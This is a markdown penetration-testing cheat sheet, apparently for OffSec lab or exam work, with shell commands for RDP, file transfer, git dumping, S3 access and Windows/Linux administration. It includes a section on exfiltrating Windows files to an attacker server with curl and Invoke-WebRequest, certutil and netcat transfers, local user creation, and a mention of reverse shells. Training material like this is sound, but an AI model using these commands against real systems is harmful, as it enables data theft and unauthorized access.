# 🦩 General

## Connecting to RDP

```shell
# add resolution support
xfreerdp3 /u:user /p:pass /v:<ip> /dynamic-resolution
# add clipboard support
xfreerdp3 /u:user /p:pass /v:<ip> +clipboard
# add a share to easily transfer files
xfreerdp3 /u:user /p:pass /v:<ip> /drive:<name>,<path> 
```

## File Transfers

### HTTP Server

```shell
# simple python server
python -m http.server <port>
# simple python upload-enabled server (optional basic auth)
pip install uploadserver
python -m uploadserver --basic-auth user:pass <port>

# WebDAV server
wsgidav -H 0.0.0.0 -p 80 --auth anonymous -r .

# Apache (copy files to /var/www/html)
sudo systemctl start apache2
```

### SMB Server

```shell
impacket-smbserver -smb2support share $(pwd) 
# win 10+ Compatibility (With Authentication)
impacket-smbserver -smb2support -user test -password test share $(pwd) 
```

### Netcat

```shell
# start a listener (nc|nc.exe)
nc -lvnp <port> > received_file

# send the file
nc <ip> <port> < <file_path>
```

### Downloading files on Windows

```shell
# PowerShell
iwr -uri <uri> -outfile <filename>

# cmd
certutil -urlcache -split -f <uri> <dest>

# copy from smb share
copy \\<ip>\share\<file>

# mount share before copy. (win 10+ w/o Authentication)
net use Z: \\<ip>\share
# mount share before copy. (win 10+ w/ Authentication)
net use Z: \\<ip>\share /u:user 'pass'
```

### Exfiltrating files from Windows

```shell
# send file to python upload-enabled server
Invoke-WebRequest -Uri http://<linux-ip>:<port>/upload -Method Post -InFile C:\path\to\file
curl -F "file=@C:\path\to\file.txt" http://<linux-ip>:<port> -u user:pass

# copy to smb share
copy C:\path\to\file \\<ip>\share
```

### Downloading files on Linux

```shell
# wget and curl
wget http://<ip>:<port>/<file>
curl -O http://<ip>:<port>/<file>
```

## Git

> [git-dumper](https://github.com/arthaud/git-dumper)

```shell
# dump git repo from url
git-dumper <url>/.git ./website

# show commits on a branch
git log
# show commit details and changes
git show <commit>
```

## AWS

!!! warning ""
    Out of scope

Setup credentials if you find access keys

```shell
aws configure
```

### S3

```shell
# list public buckets without credentials
aws s3 ls s3://<bucket>/ --endpoint-url <url> --no-sign-request

# download a bucket
aws s3 cp s3://<bucket> ./

# check bucket policy
aws s3api get-bucket-policy --bucket <bucket> --endpoint-url <url> --no-sign-request

# upload a file to a bucket
aws s3 cp <file> s3://<bucket>/ --endpoint-url <url> --no-sign-request
```

## Windows

### Utils

```shell
# search for a word in a file 
Select-String -Path "sb.txt" -Pattern "password"

# enumerate permissions
icacls "<path>"
Get-ACL "<path>"

# kill a process
taskkill /F /IM chisel.exe
# or by PID
tasklist | findstr chisel.exe
taskkill /PID <PID> /F
```

### User Management

```shell
# enumerate users and groups
net user <user>
net localgroup <group>

# create local user and add it to a group
net user <user> <pass> /add
net localgroup <group> <user> /add

# change local user's password
net user <user> <newpass>
```

## Linux

### Users

```shell
useradd -u <UID> -g <group> <uname>
# switch to user
su - <username>
# without password
sudo su - <username>
# switch to root
su -
sudo su -
```

### Network Connections

```shell
# log incoming traffic on a specific port
sudo tcpdump -nvvvXi tun0 tcp port 8080

# network connections
netstat -antp # check tcp conns on all sockets
ss -ntplu # check tcp and udp listening conns

# kill connection
fuser -k <port>/tcp
fuser -k <port>/udp
kill -9 <PID>
```

### SSH

```shell
# create keys
ssh-keygen -t rsa -b 4096
```

### Misc

```shell
# reduce binary size (useful for binaries that are going to be transferred)
upx <bin_path>
```

## VPN

!!! danger
    Offsec machines and VPN are sometimes unstable.

Reduce MTU if reverse shells are not connecting back.

```shell
ifconfig tun0 mtu 1200
```
